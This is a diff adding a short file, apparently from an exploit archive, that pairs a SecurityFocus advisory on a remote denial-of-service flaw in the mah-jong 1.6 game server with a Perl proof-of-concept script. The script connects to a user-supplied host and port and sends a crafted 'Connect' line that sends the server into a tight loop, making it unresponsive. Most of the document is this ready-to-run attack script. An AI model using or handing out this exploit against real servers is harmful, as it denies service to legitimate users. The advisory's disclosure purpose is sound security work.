@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/8558/info
+
+A remote denial of service vulnerability has been reported to affect the mah-jong game server. The issue has been reported to be exploitable so that a remote attacker may trigger a tight loop in the affected mah-jong server. This will cause the game server to be unresponsive to further commands, effectively denying service to legitimate users. 
+
+#!/usr/bin/perl -s
+use IO::Socket;
+# test it in slackware 9.0
+# DOS-test--mj1.6--code by jsk
+# mahJong 1.6, all versions of mahjong
+if(!$ARGV[0] || !$ARGV[1])
+ { print "usage: ./dosmj.pl <host> <port>\n"; exit(-1); }
+
+$host = $ARGV[0];
+$port = $ARGV[1];
+$jsk ="Connect 1034 0";
+$socket = new IO::Socket::INET (
+ Proto => "tcp",
+ PeerAddr => $host,
+ PeerPort => $port);
+
+die "unable to connect to $host:$port ($!)\n" unless $socket;
+print $socket "Connect 1034 0";
+print $socket "\r\n";
+close($socket);
